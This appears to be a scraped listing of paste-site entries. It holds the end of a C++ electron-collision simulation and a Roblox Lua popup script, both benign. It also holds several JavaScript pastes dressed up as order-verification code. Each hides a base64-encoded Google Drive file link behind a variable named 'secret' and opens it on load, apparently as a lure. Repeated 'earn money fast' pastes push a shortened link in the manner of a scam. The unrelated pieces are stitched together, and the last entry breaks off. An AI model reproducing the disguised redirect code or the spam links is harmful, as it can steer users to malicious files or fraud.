            elastic_vec[i] * n_ground +
            inelastic1_vec[i] * n_ground +
            inelastic2_vec[i] * n_ground +
            superelastic1_vec[i] * n_excited1 +
            superelastic2_vec[i] * n_excited2;
 
        double v = sqrt(2 * energy * q / m_e);
        double nu_temp = sigma_total * v;
        
        if (nu_temp > nu_max) nu_max = nu_temp;
    }
 
    std::cout << ""initial nu_max: "" <<nu_max << ""\n"";
    // -----calculating nu-max for null-collision method ends ------------////    

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995


    while (t_elapsed < total_time) {
        // Handle edge case for final step
        if (t_elapsed + dt > total_time) {
            dt = total_time - t_elapsed;
        }    
 
 
        //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
        int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;   

        // Generate shuffled list of electron indices
        int reshuffle_interval = 1;
        std::vector<int> electron_indices(n_e);
        std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index


        for (int i = 0; i < Ne_collided; ++i) {
            int j = i + std::uniform_int_distribution<int>(0, n_e - i - 1)(gen);
            std::swap(electron_indices[i], electron_indices[j]);
        }

        int exc1_coll_counter_temp = 0;
        int super1_coll_counter_temp = 0;
        int exc2_coll_counter_temp = 0;
        int super2_coll_counter_temp = 0;
        int null_coll_counter_temp = 0;

        double energy_exc = 0.0; // calculating excitation losses each timestep
        double energy_sup = 0.0; // calculating superelastic gains each timestep
        double energy_Efield = 0.0; // calculating field gains/losses each timestep


        // std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""\n"";

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided_en = false;
        for (auto& e : electrons) e.collided_ee = false;        

        int collision_counter_en = 0; // electron-neutral collision counter
        int collision_counter_ee = 0; // e-e collisoin counter

        /// -- electrin field heating along E-Z axis begin--- /// -- first half!!!
        for (int idx : electron_indices) {
            double half_dt = dt/2.0;
            energy_Efield += ( C1*electrons[idx].vz*half_dt + C2*half_dt*half_dt )/q; // dividing by q to get eV             
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = (vx*vx + vy*vy + vz*vz)*charge_mass_ratio;
        }
        // -------------------------------------------- filed heating ends ------------------------//   


        for (int idx : electron_indices) {

            if (collision_counter_en >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided_en) continue;  // Skip already collided electrons

            double dens_neutrals = (N_He/Volume);
            double dens_exc_1 = (exc_1.size()/Volume);
            double dens_exc_2 = (exc_2.size()/Volume);
            double speed = sqrt_charge_mass*sqrt(e.energy);

            int bin_energy = static_cast<int>(e.energy / bin_width);
            double nu_elastic = dens_neutrals * elastic_vec[bin_energy] * speed;
            double nu_inelastic1 = dens_neutrals * inelastic1_vec[bin_energy] * speed;
            double nu_superelastic1 = dens_exc_1 * superelastic1_vec[bin_energy] * speed;
            double nu_inelastic2 = dens_neutrals * inelastic2_vec[bin_energy] * speed;
            double nu_superelastic2 = dens_exc_2 * superelastic2_vec[bin_energy] * speed;

            double r = dis(gen);

            double P0 = nu_elastic/nu_max;
            double P1 = (nu_elastic + nu_inelastic1)/nu_max;
            double P2 = (nu_elastic + nu_inelastic1 + nu_superelastic1)/nu_max;
            double P3 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2)/nu_max;
            double P4 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2 + nu_superelastic2)/nu_max;            

            if (r < P0) {
 
                // elastic collision happens
 
                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x_1 = e.vx;
                double V0_y_1 = e.vy;
                double V0_z_1 = e.vz;
 
                // neutral particle X Y Z initial velocities
 
                // randomize particles each collision
                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V0_x_2 = tmp_neutral.vx;
                double V0_y_2 = tmp_neutral.vy;
                double V0_z_2 = tmp_neutral.vz;
 
                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 
 
                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);
 
                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);
 
                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)
 
                double V_cm_x = (m_e*V0_x_1 + M_n*V0_x_2)/(m_e + M_n);
                double V_cm_y = (m_e*V0_y_1 + M_n*V0_y_2)/(m_e + M_n);
                double V_cm_z = (m_e*V0_z_1 + M_n*V0_z_2)/(m_e + M_n);                    
 
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                // double cos_theta = (2.0 + e.energy - 2.0*pow((1.0+e.energy),R1))/e.energy;
                // double sin_theta = sqrt(abs(1.0-cos_theta*cos_theta));
                double phi = 2*M_PI*R2;
 
                //calculating final relative velocity with random direction
 
                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);
 
                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);
 
                //calculating final velocity of electron
 
                double V_x_1 = V_cm_x + V_rel_x * (M_n/(m_e + M_n));
                double V_y_1 = V_cm_y + V_rel_y * (M_n/(m_e + M_n));
                double V_z_1 = V_cm_z + V_rel_z * (M_n/(m_e + M_n));
 
                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);
 
                //updating electron energy and velocities
                
                e.energy = m_e*V_1*V_1/(2.0*q);
                e.vx = V_x_1;
                e.vy = V_y_1;
                e.vz = V_z_1;
 
                collision_counter_en++;
                el_coll_counter++;
 
                e.collided_en = true;
            }      

            else if (r < P1) {

                //inelastic 1(triplet) collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh1) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh1;

                    double speed = sqrt_charge_mass*sqrt(e.energy);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc1_coll_counter++;
                    exc1_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_1
                    if (N_He > 0) {
                        exc_1.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }     

            else if (r < P2) {

                //superelastic 1(triplet -> ground state) collision happens

                if (exc_1.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_1.size()-1)(gen);
                Excited_neutral& exc = exc_1[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh1;

                double speed = sqrt_charge_mass*sqrt(e.energy);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector
                if (!exc_1.empty()) {
                    std::swap(exc_1[index], exc_1.back());
                    exc_1.pop_back();
                    N_He++;
                }
                collision_counter_en++;   
                super1_coll_counter++;
                super1_coll_counter_temp++;
                energy_sup += thresh1;

                e.collided_en = true;
            }  

            else if (r < P3) {

                //inelastic 1(singlet) excitation collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh2) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh2;
 
                    double speed = sqrt_charge_mass*sqrt(e.energy);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc2_coll_counter++;
                    exc2_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_2

                    if (N_He > 0) {
                        exc_2.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }

            else if (r < P4) {

                //supernelastic 1(singlet -> ground state) collision happens

                if (exc_2.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_2.size()-1)(gen);
                Excited_neutral& exc = exc_2[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh2;

                double speed = sqrt_charge_mass*sqrt(e.energy);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector

                if (!exc_2.empty()) {
                    std::swap(exc_2[index], exc_2.back());
                    exc_2.pop_back();
                    N_He++;
                }

                collision_counter_en++;   
                super2_coll_counter++;
                super2_coll_counter_temp++;
                energy_sup += thresh2;

                e.collided_en = true;
            }              

            else {
                // null-collision
                collision_counter_en++;
                null_coll_counter++;
                e.collided_en = true;
            }
        }


        /// -- electrin field heating along E-Z axis begin--- /// -- second half!!!
        for (int idx : electron_indices) {
            double half_dt = dt/2.0;
            energy_Efield += ( C1*electrons[idx].vz*half_dt + C2*half_dt*half_dt )/q; //dividing by q to get eV
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = (vx*vx + vy*vy + vz*vz) * charge_mass_ratio;
        }
        // -------------------------------------------- filed heating ends ------------------------////////////////

        int decay_counter = 0;

        // // Iterate backwards to safely remove elements
        // for (int i = exc_2.size() - 1; i >= 0; --i) {
        //     if (dis(gen) < dt / tau_singlet) {
        //         // Swap with last element and pop (like your superelastic code)
        //         std::swap(exc_2[i], exc_2.back());
        //         exc_2.pop_back();
        //         N_He++;
        //         decay_counter++;
        //     }
        // }


        t_elapsed += dt; // Advance time
 
        // Recalculate nu_max periodically (e.g., every 100 steps)
        static int recalc_counter = 0;
        if (++recalc_counter >= 1000) {
            
            recalc_counter = 0;
 
            // Recalculate nu_max with CURRENT densities
            nu_max = 0.0;
            for (int i = 0; i < N; i++) {
                double energy = Emin + (i + 0.5) * bin_width;
                
                // Get current densities
                double n_ground = N_He / Volume;
                double n_excited1 = exc_1.size() / Volume;
                double n_excited2 = exc_2.size() / Volume;
                
                // Total collision frequency for this energy bin
                double sigma_total = 
                    elastic_vec[i] * n_ground +
                    inelastic1_vec[i] * n_ground +
                    inelastic2_vec[i] * n_ground +
                    superelastic1_vec[i] * n_excited1 +
                    superelastic2_vec[i] * n_excited2;
 
                double speed = sqrt_charge_mass*sqrt(energy);
                double nu_temp = sigma_total * speed;
                
                if (nu_temp > nu_max) nu_max = nu_temp;
            }

            // Update dt based on new nu_max
            dt = 0.1 / nu_max;        
        }   

        // calculating mean energy 
        if (static_cast<int>(t_elapsed/dt)%print_interval == 0) {
            double total_energy = 0.0;
            for (const auto& e : electrons) total_energy += e.energy;
            double mean_energy = total_energy / n_e;
            file8 << t_elapsed << "" "" << mean_energy << ""\n"";            
            file_temp << t_elapsed << "" "" << exc_1.size() << "" "" << exc_2.size() << ""\n"";
            std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""%"" << "" "";
            std::cout << ""   nu_max: "" << nu_max << ""    "" << ""dt: "" << dt << "" "" << ""decay counter: "" << decay_counter <<   ""\n"";
            file16 << t_elapsed << "" "" << energy_Efield/n_e << "" "" << energy_sup/n_e << ""\n"";
        }        

    }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = static_cast<int>( (electrons[i].energy - Emin)/bin_width_smooth);
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < N_smooth; i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width_smooth;
        file4 << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; // getting f(E)
    }

        std::cout << ""Total # of electrons in a final histogram: "" << check << ""\n"";
        std::cout << ""Final nu max: "" << nu_max << ""\n"";

    // ----- final electron energies distribution ends


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();
    file10.close();
    file11.close();
    file12.close();
    file13.close();
    file14.close();
    file15.close();
    file_temp.close();
    file16.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    // std::cout << ""# of steps: "" << steps << ""\n"";
    // std::cout << ""# of electrons collided each timesteps:"" << Ne_collided << ""\n"";
    
    // std::cout << ""Average elastic collisions per timestep: "" << static_cast<int>(el_coll_counter/steps) << ""\n"";
    // std::cout << ""Average null collisions per timestep: "" << static_cast<int>(null_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""triplet:________"" << ""\n"";
    // std::cout << ""Average triplet excitation collisions per timestep: "" << static_cast<int>(exc1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic triplet collisions per timestep: "" << static_cast<int>(super1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""singlet:________"" << ""\n"";
    // std::cout << ""Average singlet excitation collisions per timestep: "" << static_cast<int>(exc2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic singlet collisions per timestep: "" << static_cast<int>(super2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";    

    // std::cout << ""Average e-e collisions per timestep: "" << static_cast<int>(ee_coll_counter/steps) << ""\n"";

    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
m6xfKgL0,Order.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 07:05:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45058/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rkK2R6S1,Make $1000 15-MINUTES (BEGINNER) 2J,nooooooooootbr,JavaScript,Saturday 19th of April 2025 07:04:43 PM CDT," 
Pdf https://tinyurl.com/privguidee


Vp9lvJCu8r
"
XhLZPFbc,EARN $900 INSTANTLY 2025 8F,nooooooooootbr,JavaScript,Saturday 19th of April 2025 06:51:11 PM CDT," 
Pdf https://tinyurl.com/privguidee


7VZbc6j9vg
"
DVS0ZuNY,Market.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 06:49:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64848/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ivZwYumw,Make $1000 15-MINUTES  (BEGINNER) HA,nooooooooootbr,JavaScript,Saturday 19th of April 2025 06:37:42 PM CDT," 
Pdf https://tinyurl.com/privguidee


DWkMW0PdhH
"
6YxeX9jN,Untitled,Epiphemeral,JavaScript,Saturday 19th of April 2025 06:34:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98886/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pk2fcjtW,Popup Part w/ ProximityPrompt,bookedsam,Lua,Saturday 19th of April 2025 06:31:21 PM CDT,"-- openStudio Popup Parts
-- Local Popup Handler
-- Build 3.5 ProximityPrompt 20/4/25

-- // CONFIG

--  Watch the tutorial by @bookedsam for help configuring the system. 

local config = { -- Change these settings how you like. Settings are case sensitive.
	
	-- The name of the theme. Included themes:
	-- ""Classic light"" ""Classic dark"" ""Bubbly"" ""Code"" ""Modern"" ""Transparent""
	[""Theme""] = ""Classic light"",
	
	-- The type of animation. Included animations:
	-- ""Fade"" ""Typewriter"" ""Bounce""
	[""Animation""] = ""Fade"",
	
	-- Set to false if you want it to only work once.
	[""Repeat""] = false
	
}

--  ONLY EDIT BEYOND THIS POINT IF YOU KNOW WHAT YOU ARE DOING 

-- // VARIABLES

local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local TweenService = game:GetService(""TweenService"")
local Players = game:GetService(""Players"")

local themes = ReplicatedStorage:WaitForChild(""openPopup"")
local partFolder = workspace:WaitForChild(""openPopup"")

local label = nil
local labelSave = nil
local animations = {}

-- // FUNCTIONS

-- Animation that fades in and out the text.
animations.Fade = function(text: string)
	
	local info = TweenInfo.new(1)
	
	local fadeIn = TweenService:Create(label, info, 
		{BackgroundTransparency = labelSave.BackgroundTransparency, 
		TextTransparency = labelSave.TextTransparency})
	local fadeOut = TweenService:Create(label, info, 
		{BackgroundTransparency = 1,
		TextTransparency = 1})
	
	label.Transparency = 1
	fadeIn:Play()
	fadeIn.Completed:Wait()
	task.wait(string.len(text) / 20)
	fadeOut:Play()
	fadeOut.Completed:Wait()
	
end

-- Animation that has a typing effect.
animations.Typewriter = function(text: string)
	
	local infoType = TweenInfo.new(string.len(text) / 10, Enum.EasingStyle.Linear)
	local infoFade = TweenInfo.new(0.5)
	
	local typeIn = TweenService:Create(label, infoType, {MaxVisibleGraphemes = string.len(text)})
	
	local fadeIn = TweenService:Create(label, infoFade, {BackgroundTransparency = labelSave.BackgroundTransparency})
	local fadeOut = TweenService:Create(label, infoFade, {BackgroundTransparency = 1})
	
	label.MaxVisibleGraphemes = 0
	label.BackgroundTransparency = 1
	fadeIn:Play()
	typeIn:Play()
	typeIn.Completed:Wait()
	task.wait(string.len(text) / 20)
	fadeOut:Play()
	fadeOut.Completed:Wait()
	
end

-- Animation where the text object jumps into frame.
animations.Bounce = function(text: string)
	
	local info = TweenInfo.new(0.5, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out)
	
	local bounceIn = TweenService:Create(label, info, {Size = labelSave.Size})
	local bounceOut = TweenService:Create(label, info, {Size = UDim2.new(0, 0, 0 ,0)})
	
	label.Size = UDim2.new(0, 0, 0, 0)
	bounceIn:Play()
	bounceIn.Completed:Wait()
	task.wait(string.len(text) / 20)
	bounceOut:Play()
	bounceOut.Completed:Wait()
	
end

local function setupPart(part)
	if part:IsA(""Part"") then

		for _, e in ipairs(part:GetChildren()) do

			if e:IsA(""Decal"") then e:Destroy() end

		end

		local partText = part:WaitForChild(""Text"").Value
		local debounce = false
		
		local connection
		connection = part:WaitForChild(""ProximityPrompt"").Triggered:Connect(function()

			if debounce then return end
			debounce = true
			part:WaitForChild(""ProximityPrompt"").Enabled = false

			label.Text = partText
			label.Visible = true
			animations[config.Animation](partText)
			label.Visible = false

			task.wait(1)
			if config.Repeat then 
				debounce = false
				part:WaitForChild(""ProximityPrompt"").Enabled = true
			else connection:Disconnect() end
		end)
	end
end

-- // SETUP

if not animations[config.Animation] then
	
	warn(""[openPopup] The animation you set could not be found! Defaulting to 'Fade'."")
	config.Animation = ""Fade""
	
end

if not themes:WaitForChild(config.Theme, 1) then
	
	warn(""[openPopup] The theme you set could not be found! Defaulting to 'Classic light'"")
	config.Theme = ""Classic light""
	
end

label = themes:WaitForChild(config.Theme):Clone()
label.Visible = false
label.Parent = script.Parent
labelSave = themes:WaitForChild(config.Theme)

print(""[openPopup] openStudio Popup System ready. Have any errors? Contact @bookedsam."")

-- // MAIN

task.wait(1)

for _, v in ipairs(partFolder:GetChildren()) do
	setupPart(v)
end

partFolder.ChildAdded:Connect(function(part)
	setupPart(part)
end)"
K9crxHxD,EARN $900 INSTANTLY 2025 XH,nooooooooootbr,JavaScript,Saturday 19th of April 2025 06:24:16 PM CDT," 
Pdf https://tinyurl.com/privguidee


FhKBijHSfm
"
0NH8P6PB,Products.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 06:18:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97637/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
